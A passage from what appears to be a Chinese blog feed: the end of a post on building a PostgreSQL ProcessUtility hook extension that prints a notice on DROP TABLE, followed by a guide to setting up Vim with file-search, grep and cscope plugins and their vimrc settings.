class="comment">//将我们定义的函数指针,指向Pg系统原有函数地址; 本身NULL; -- 起参数交换作用;</span></span><br><span class="line">    ProcessUtility_hook = record_oper_info; <span class="comment">//将系统指向我们需要其执行的函数;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">_PG_fini(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ProcessUtility_hook = prev_proccessutility_hook; <span class="comment">//卸载lib库时,指向原有函数;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>alter_oper.control</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> alter_oper.control</span><br><span class="line">comment = 'Pg Judicious function'</span><br><span class="line">default_version = '1.0'</span><br><span class="line">module_pathname = '$libdir/alter_oper'</span><br><span class="line">relocatable = true</span><br></pre></td></tr></table></figure><p><code>Makefile</code></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># contrib/alter_oper/Makefile</span></span><br><span class="line">MODULES = alter_oper</span><br><span class="line">EXTENSION = alter_oper</span><br><span class="line">PGFILEDESC = <span class="string">"alter_oper - Pg Hook test"</span></span><br><span class="line">REGRESS = alter_oper</span><br><span class="line"></span><br><span class="line"><span class="keyword">ifdef</span> USE_PGXS</span><br><span class="line">PG_CONFIG = pg_config</span><br><span class="line">PGXS := <span class="variable">$(<span class="built_in">shell</span> <span class="variable">$(PG_CONFIG)</span> --pgxs)</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(PGXS)</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">subdir = contrib/alter_oper</span><br><span class="line">top_builddir = ../..</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(top_builddir)</span>/src/Makefile.global</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(top_srcdir)</span>/contrib/contrib-global.mk</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure><p><code>postgresql.conf</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">## postgresql.conf</span><br><span class="line">shared_preload_libraries = &apos;alter_oper&apos;     # (change requires restart)</span><br></pre></td></tr></table></figure><p><strong>验证</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shell=# \d</span><br><span class="line">           List of relations</span><br><span class="line">     Schema     | Name | Type  | Owner  </span><br><span class="line">----------------+------+-------+--------</span><br><span class="line"> oracle_catalog | dual | view  | Pg</span><br><span class="line"> public         | std  | table | Pg</span><br><span class="line">(2 rows)</span><br><span class="line"></span><br><span class="line">shell=# drop table std ;</span><br><span class="line">NOTICE:  00000: Drop ? it`s not allowd   ===&gt; 输出;</span><br><span class="line">DROP TABLE</span><br></pre></td></tr></table></figure></p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a><strong>补充</strong></h4><p><code>your_extension--1.0.control</code> 里面主要是写一些控制信息，</p><p><code>your_extension--1.0.sql</code> 用于创建一些你需要的数据库对象，比如表，触发器，函数等等。</p><p>只有在扩展Sql函数中才会使用，Hook不需要；</p><p><br></p><h4 id="模板下载"><a href="#模板下载" class="headerlink" title="模板下载"></a>模板下载</h4><p><a href="/download/postgresql/hook-alter_oper.tar.gz">模板代码下载</a></p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>打造自己的 Vim</title>
      <link href="/2018/09/27/software/%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84-Vim/"/>
      <url>/2018/09/27/software/%E6%89%93%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84-Vim/</url>
      
        <content type="html"><![CDATA[<p>将自己的GVIM实现成为:</p><ul><li>能自由显示/关闭目录栏</li><li>能实现自由文件搜索 [精准搜索/正则模糊搜索]</li><li>设置工作目录，并进行目录跳转-能在新目录文件搜索  </li><li>全局文件关键字搜索</li><li>代码阅读 相关函数调用，定义等查看</li><li>代码静态检查</li><li>代码注释功能，提供snippets</li><li>YCM  - Mac 已安装，Linux 与 Window 未安装</li></ul><h4 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h4><ul><li>F2   开启/关闭nerdtree</li><li>F3   开启/关闭 Taglist</li><li>F4   开启/关闭 quickfix面板 [ CtrlSF/ cscope ]</li><li>“\” +  s 打开静态代码检查错误面板</li><li>Ctrl + p 文件搜索</li><li>Ctrl + b 文件搜索列表</li><li>Ctrl + r  开启/关闭模糊匹配</li><li>Ctrl + v 在当前文件 竖直方式打开新文件</li><li>Ctrl + y 在当前目录添加新文件</li><li>Ctrl + t 在新建Tab页打开</li><li>Ctrl + f  全局关键字搜索</li><li>Shift + s 查找代码函数链接</li><li>Shift + c 查找调用本函数的函数</li><li>Shift + g 查找本定义</li><li>Alt + Num 进行Tab页的切换</li><li>Alt + t   打开新的Tab页</li></ul><p><br><br><a id="more"></a></p><p>搭建环境:</p><ul><li>Win 10</li><li>CentOS 7.1</li></ul><p>前述:</p><ul><li>本文不讲解如何在window安装Gvim，学习window安装vim请阅读<a href="https://github.com/zhangguixu/window-vim" target="_blank" rel="noopener">请点击</a></li><li>包管理<code>PluginInstal PluginClean</code>  不在此说明</li><li>相关插件下载请看文章末尾</li></ul><h4 id="Linux-vim-8-0"><a href="#Linux-vim-8-0" class="headerlink" title="Linux-vim-8.0"></a><a href="/download/vim/vim.zip">Linux-vim-8.0</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum install ncurses-devel </span><br><span class="line">wget https://github.com/vim/vim/archive/master.zip </span><br><span class="line">unzip master.zip </span><br><span class="line">cd vim-master </span><br><span class="line">cd src/ </span><br><span class="line">./configure --enable-multibyte --enable-pythoninterp=yes</span><br><span class="line">make </span><br><span class="line">sudo make install </span><br><span class="line">vim --version</span><br></pre></td></tr></table></figure><p>重新编译的时候，想要支持 <code>python2.x</code>，则加入 <code>--enable-pythoninterp=yes</code> 参数。如果想开启 <code>Python3</code> 支持，则 <code>--enable-python3interp=yes</code>。</p><p><br></p><h4 id="Tab标签页切换"><a href="#Tab标签页切换" class="headerlink" title="Tab标签页切换"></a>Tab标签页切换</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:tabnew [++opt选项] ［＋cmd］ 文件            建立对指定文件新的tab</span><br><span class="line">:tabc       关闭当前的tab</span><br><span class="line">:tabo       关闭所有其他的tab</span><br><span class="line">:tabs       查看所有打开的tab</span><br><span class="line">:tabp      前一个</span><br><span class="line">:tabn      后一个</span><br><span class="line">标准模式下：</span><br><span class="line">gt , gT 可以直接在tab之间切换。</span><br><span class="line">更多可以查看帮助 :help table ， help -p</span><br></pre></td></tr></table></figure><p>Vimrc快捷键设置: Alt被xshell占用，未配置;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nn &lt;M-1&gt; 1gt</span><br><span class="line">nn &lt;M-2&gt; 2gt</span><br><span class="line">nn &lt;M-3&gt; 3gt</span><br><span class="line">nn &lt;M-4&gt; 4gt</span><br><span class="line">nn &lt;M-5&gt; 5gt</span><br><span class="line">nn &lt;M-6&gt; 6gt</span><br><span class="line">nn &lt;M-7&gt; 7gt</span><br><span class="line">nn &lt;M-8&gt; 8gt</span><br><span class="line">nn &lt;M-9&gt; 9gt</span><br><span class="line">nn &lt;M-0&gt; :tablast&lt;CR&gt;</span><br><span class="line">nn &lt;M-t&gt; :tabnew&lt;CR&gt;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h4><p>包安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bundle &apos;scrooloose/nerdtree&apos;</span><br></pre></td></tr></table></figure><p>参数配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot; nerdTree快捷键映射</span><br><span class="line">let NERDTreeWinPos=&apos;left&apos;</span><br><span class="line">let NERDTreeWinSize=25</span><br><span class="line"></span><br><span class="line">map &lt;F2&gt; :NERDTreeToggle&lt;CR&gt;</span><br><span class="line">&quot; 如果最后一个是nerdTree 则自动关闭;</span><br><span class="line">autocmd bufenter * if (winnr(&quot;$&quot;) == 1 &amp;&amp; exists(&quot;b:NERDTreeType&quot;) &amp;&amp;b:NERDTreeType == &quot;primary&quot;) | q | endif</span><br></pre></td></tr></table></figure><p>F2 启动/关闭菜单栏</p><p><strong>模式:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通过 ctrl + w 加上方向键切换到 NERDTree 工具条，键入 m：</span><br><span class="line"></span><br><span class="line">NERDTree Menu. Use j/k/enter and the shortcuts indicated</span><br><span class="line">==========================================================</span><br><span class="line">&gt; (a)dd a childnode# 一个节点，可以是文件或者文件夹</span><br><span class="line">  (m)ove the current node# 移动或者重命名当前节点</span><br><span class="line">  (d)elete the current node# 删除当前节点</span><br><span class="line">  (c)opy the current node</span><br><span class="line">  (l)ist the current node</span><br></pre></td></tr></table></figure><p><br></p><h4 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h4><p>包安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plugin &apos;ctrlpvim/ctrlp.vim&apos;</span><br></pre></td></tr></table></figure><p>Vimrc配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">let g:ctrlp_map = &apos;&lt;c-p&gt;&apos;</span><br><span class="line">let g:ctrlp_cmd = &apos;CtrlP&apos;</span><br><span class="line">let g:ctrlp_match_window = &apos;min:4,max:15&apos;   &quot; 最大匹配15;</span><br><span class="line">let g:ctrlp_max_depth=20</span><br><span class="line">let g:ctrlp_follow_symlinks=1</span><br><span class="line">let g:ctrlp_use_caching=0  &quot;未启用 ；  每个回话的缓存; -</span><br><span class="line">let g:ctrlp_clear_cache_on_exit=0 &quot;退出vim不删除缓存文件;</span><br><span class="line">let g:ctrlp_cache_dir=$HOME.&apos;/.cache/ctrlp&apos; &quot;设置缓存目录; -- 如果添加文件 请F5重建;</span><br><span class="line">let g:ctrlp_working_path_mode = &apos;rw&apos;  &quot;用于支持lcd目录跳转，重建索引;  CtrlPRoot</span><br><span class="line">&quot; 单个版本控制系统，列出命令不会列出没有被追踪的文件:</span><br><span class="line">let g:ctrlp_user_command = [&apos;.git&apos;, &apos;cd %s &amp;&amp; git ls-files&apos;]</span><br><span class="line">set wildignore+=*\\node_modules\\*,*.git*,*.svn*,*.zip*,*.exe* &quot; 使用vim的忽略文件</span><br></pre></td></tr></table></figure><p>我们在VIm中使用<code>lcd</code> 切换目录。 当我们切换时 需要在配置文件中开启<code>let g:ctrlp_working_path_mode = &#39;rw&#39;</code>   用于建立当前目录下的索引。 来快速搜索， 不然索引还是保持在之前文件中。</p><p>:help CtrlP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">总览:~</span><br><span class="line"></span><br><span class="line">  |loaded_ctrlp|................禁用插件。</span><br><span class="line">  |ctrlp_map|...................默认按键绑定。</span><br><span class="line">  |ctrlp_cmd|...................默认按键绑定调用的命令。</span><br><span class="line">  |ctrlp_by_filename|...........是否默认开启文件名模式。</span><br><span class="line">  |ctrlp_regexp|................是否默认开启正则表达式模式。</span><br><span class="line">  |ctrlp_match_window|..........匹配窗口的显示位置。</span><br><span class="line">  |ctrlp_switch_buffer|.........如果文件已在缓冲区中打开，跳转到该打开的缓冲区。</span><br><span class="line">  |ctrlp_reuse_window|..........重用特殊窗口（帮助、快速修复 |quickfix| ，等等）。</span><br><span class="line">  |ctrlp_tabpage_position|......新标签页出现的位置。</span><br><span class="line">  |ctrlp_working_path_mode|.....如何设置CtrlP的本地工作目录。</span><br><span class="line">  |ctrlp_root_markers|..........额外的，高优先级的根目录标识。</span><br><span class="line">  |ctrlp_use_caching|...........针对每个会话，设置是否开启缓存的。</span><br><span class="line">  |ctrlp_clear_cache_on_exit|...退出Vim后是否保留缓存。</span><br><span class="line">  |ctrlp_cache_dir|.............缓存目录的位置。</span><br><span class="line">  |ctrlp_show_hidden|...........是否显示隐藏文件和隐藏文件夹。</span><br><span class="line">  |ctrlp_custom_ignore|.........使用 |globpath()| 时自定义忽略的文件或目录。</span><br><span class="line">  |ctrlp_max_files|.............扫描文件的最大数目。</span><br><span class="line">  |ctrlp_max_depth|.............扫描目录的最大层数。</span><br><span class="line">  |ctrlp_user_command|..........使用外部的扫描工具。</span><br><span class="line">  |ctrlp_max_history|...........历史提示符面板中保留的最大条目数。</span><br><span class="line">  |ctrlp_open_new_file|.........由&lt;c-y&gt;创建的文件的打开方式。</span><br><span class="line">  |ctrlp_open_multiple_files|...由&lt;c-z&gt;选择的文件的打开方式。</span><br><span class="line">  |ctrlp_arg_map|...............是否拦截&lt;c-y&gt; 和 &lt;c-o&gt; 命令。</span><br><span class="line">  |ctrlp_follow_symlinks|.......是否跟随链接。</span><br><span class="line">  |ctrlp_lazy_update|...........停止输入时才更新。</span><br><span class="line">  |ctrlp_default_input|.........为提示符面板提供一个初始字符串。</span><br><span class="line">  |ctrlp_abbrev|................输入缩写。</span><br><span class="line">  |ctrlp_key_loop|..............为多字节输入开启输入事件循环。</span><br><span class="line">  |ctrlp_prompt_mappings|.......改变提示符面板内部的按键绑定。</span><br><span class="line">  |ctrlp_line_prefix|...........ctrlp 窗口中为每一行添加前缀。</span><br><span class="line">  |ctrlp_open_single_match|.....当只有一个候选时自动接受。</span><br><span class="line">  |ctrlp_brief_prompt|..........提示符为空的时候使用&lt;bs&gt;退出 CtrlP。</span><br><span class="line">  |ctrlp_match_current_file|....在匹配条目中包含当前文件。</span><br><span class="line">  |ctrlp_types|.................內建类型的名称。</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &lt;F5&gt;</span><br><span class="line">    - 刷新匹配窗口并且清除当前目录的缓存。</span><br><span class="line">    - 从最近最多使用中移除被删除的文件。</span><br><span class="line"></span><br><span class="line">  &lt;F7&gt;</span><br><span class="line">    最近最多使用模式：</span><br><span class="line">    - 清除最近最多使用列表。</span><br><span class="line">    - 删除被 &lt;c-z&gt; 标记的最近最多使用条目。</span><br><span class="line">    缓冲区模式：</span><br><span class="line">    - 删除光标下的条目或者删除被 &lt;c-z&gt; 标记的多个条目。</span><br></pre></td></tr></table></figure><p><strong>常用操作</strong></p><ul><li>Ctrl + b 切换， 从缓冲区， 最近文件 与 目录 — 查找位置;</li><li>Ctrl + r 切换  字符串与正则表达式之间切换。</li><li>Ctrl + v 在当前文件 竖直方式打开新文件</li><li>Ctrl + y 在当前目录添加新文件。</li><li>Ctrl + t 在新建Tab页打开</li><li>F5  重建当前目录文件，并且删除 最近打开文件中， 已删除文件</li><li>F7  删除最近打开文件。</li></ul><p><br></p><h4 id="全局文件内关键字搜索"><a href="#全局文件内关键字搜索" class="headerlink" title="全局文件内关键字搜索"></a>全局文件内关键字搜索</h4><p>存在插件有</p><ol><li>EasyGrep</li><li>Ack.vim</li></ol><p>但是vim本身即实现此种操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /tablespace_sizeofcu/ ** | copen</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 只搜索当前文件 vim /main/ % | copen</span><br><span class="line">2. 只搜索当前目录 vim /main/ * | copen   </span><br><span class="line">3. 搜索上级目录下，并递归 vim /main/ ../** | copen</span><br><span class="line">4. 可以在多个路径中搜索  vim /main path1/** path2/** | copen</span><br></pre></td></tr></table></figure><p><strong>效率太慢</strong></p><p>CtrlSF</p><p>包安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plugin &apos;dyng/ctrlsf.vim&apos;</span><br></pre></td></tr></table></figure><p>Vimrc配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nnoremap &lt;C-f&gt; :CtrlSF&lt;Space&gt;</span><br><span class="line">let g:ctrlsf_default_view_mode = &apos;compact&apos;</span><br><span class="line">let g:ctrlsf_ackprg=&apos;ack&apos;   &quot; 设置为ag;</span><br><span class="line">let g:ctrlsf_auto_close=0  &quot;设置不自动关闭;</span><br><span class="line">let g:ctrlsf_case_sensitive=&apos;no&apos;  &quot;大小写不敏感;</span><br><span class="line">let g:ctrlsf_ignore_dir=[&apos;tags&apos;, &apos;.git&apos;, &apos;.svn&apos;]  &quot;忽略tags;</span><br><span class="line">let g:ctrlsf_default_root=&apos;project&apos;</span><br></pre></td></tr></table></figure><p><strong>CtrlSF_default_root</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">g:ctrlsf_default_root                                  *&apos;g:ctrlsf_default_root&apos;*</span><br><span class="line">Default: &apos;cwd&apos;</span><br><span class="line">Available: &apos;cwd&apos;, &apos;project&apos;, &apos;project+xx&apos;</span><br><span class="line">Defines how CtrlSF works if no explicit search path is given. Possible value</span><br><span class="line">is &apos;cwd&apos;,&apos;project&apos; and &apos;project+xx&apos;.(&apos;xx&apos; is two sub-options for &apos;project&apos;.)</span><br><span class="line"></span><br><span class="line">Explanation for each option:</span><br><span class="line"></span><br><span class="line">&apos;cwd&apos;         - Use current working directory.</span><br><span class="line">&apos;project&apos;     - CtrlSF will try to find project root from current file to</span><br><span class="line">                its ancestors. A project root is a directory with VCS</span><br><span class="line">                folder is placed in. Currently CtrlSF can recognize .git,</span><br><span class="line">                .hg, .svn, .bzr, _darcs.</span><br><span class="line">&apos;project+xx&apos;  - Same as &apos;project&apos;. But you can have more control about how</span><br><span class="line">                project directory is found and fallback root if no project</span><br><span class="line">                root is found.</span><br><span class="line"></span><br><span class="line">    First &apos;x&apos; defines from where to search project root. It has 2 possible</span><br><span class="line">    values:</span><br><span class="line">        &apos;f&apos; - search from current file.</span><br><span class="line">        &apos;w&apos; - search from current working directory.</span><br><span class="line"></span><br><span class="line">    Second &apos;x&apos; defines the fallback search root for the case project root is</span><br><span class="line">    not found. It has 2 possible values:</span><br><span class="line">        &apos;f&apos; - current file is fallback search root.</span><br><span class="line">        &apos;w&apos; - current working directory is fallback search root.</span><br><span class="line"></span><br><span class="line">    Option &apos;project&apos; is identical to &apos;project+ff&apos;.</span><br></pre></td></tr></table></figure><p>检索更快的 <a href="/download/vim/ag-install-pachage.zip">ag</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yum -y groupinstall &quot;Development Tools&quot;</span><br><span class="line">yum -y install pcre-devel xz-devel</span><br><span class="line">sudo git clone https://github.com/ggreer/the_silver_searcher.git</span><br><span class="line">cd the_silver_searcher</span><br><span class="line">sudo ./build.sh</span><br><span class="line">sudo make install</span><br><span class="line">which ag</span><br><span class="line">==&gt; /usr/local/bin/ag</span><br></pre></td></tr></table></figure><p><br></p><h4 id="cscope-代码跳转"><a href="#cscope-代码跳转" class="headerlink" title="cscope 代码跳转"></a>cscope 代码跳转</h4><blockquote><p>cscopen  本身就是Unix血统，是Linux所自动支持的。</p></blockquote><p><a href="/download/vim/cscope_windows.7z">window下载cscope</a>     解压后放置在 vim 同目录即可[不需再修改环境变量]。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscope -Rbq  生成索引文件</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">cscope commands:</span><br><span class="line">add  : Add a new database             (Usage: add file|dir [pre-path] [flags])</span><br><span class="line">find : Query for a pattern            (Usage: find a|c|d|e|f|g|i|s|t name)</span><br><span class="line">       a: Find assignments to this symbol</span><br><span class="line">       c: Find functions calling this function</span><br><span class="line">       d: Find functions called by this function</span><br><span class="line">       e: Find this egrep pattern</span><br><span class="line">       f: Find this file</span><br><span class="line">       g: Find this definition</span><br><span class="line">       i: Find files #including this file</span><br><span class="line">       s: Find this C symbol</span><br><span class="line">       t: Find this text string</span><br><span class="line">help : Show this message              (Usage: help)</span><br><span class="line">kill : Kill a connection              (Usage: kill #)</span><br><span class="line">reset: Reinit all connections         (Usage: reset)</span><br><span class="line">show : Show connections               (Usage: show)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    0 或 s   查找本 C 符号(可以跳过注释) </span><br><span class="line">    1 或 g   查找本定义 </span><br><span class="line">    2 或 d   查找本函数调用的函数 </span><br><span class="line">    3 或 c   查找调用本函数的函数 </span><br><span class="line">    4 或 t   查找本字符串 </span><br><span class="line">    6 或 e   查找本 egrep 模式 </span><br><span class="line">    7 或 f   查找本文件 </span><br><span class="line">    8 或 i   查找包含本文件的文件</span><br></pre></td></tr></table></figure><p>Vimrc 参数配置;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</span><br><span class="line">&quot; cscope setting</span><br><span class="line">&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</span><br><span class="line">&quot;setcscopequickfix=s-,c-,d-,i-,t-,e-</span><br><span class="line"></span><br><span class="line">if has(&quot;cscope&quot;)</span><br><span class="line">    set csprg=/usr/bin/cscope</span><br><span class="line">    set csto=1</span><br><span class="line">    set cst</span><br><span class="line">    set nocsverb</span><br><span class="line">    &quot; add any database in current directory</span><br><span class="line">    if filereadable(&quot;cscope.out&quot;)</span><br><span class="line">        cs add cscope.out</span><br><span class="line">    endif</span><br><span class="line">    set csverb</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">nmap &lt;S-s&gt; :cs find s &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;</span><br><span class="line">nmap &lt;S-g&gt; :cs find g &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;</span><br><span class="line">nmap &lt;S-c&gt; :cs find c &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;</span><br><span class="line">nmap &lt;S-t&gt; :cs find t &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;</span><br><span class="line">nmap &lt;S-e&gt; :cs find e &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;</span><br><span class="line">nmap &lt;S-f&gt; :cs find f &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;</span><br><span class="line">nmap &lt;S-i&gt; :cs find i ^&lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;$&lt;CR&gt;</span><br><span class="line">nmap &lt;S-d&gt; :cs find d &lt;C-R&gt;=expand(&quot;&lt;cword&gt;&quot;)&lt;CR&gt;&lt;CR&gt;</span><br></pre></td></tr></table></figure><p>Shit+ 热键即可使用;</p><p>但window并不能显示qiuckfix窗口 后添加 <code>:copen</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 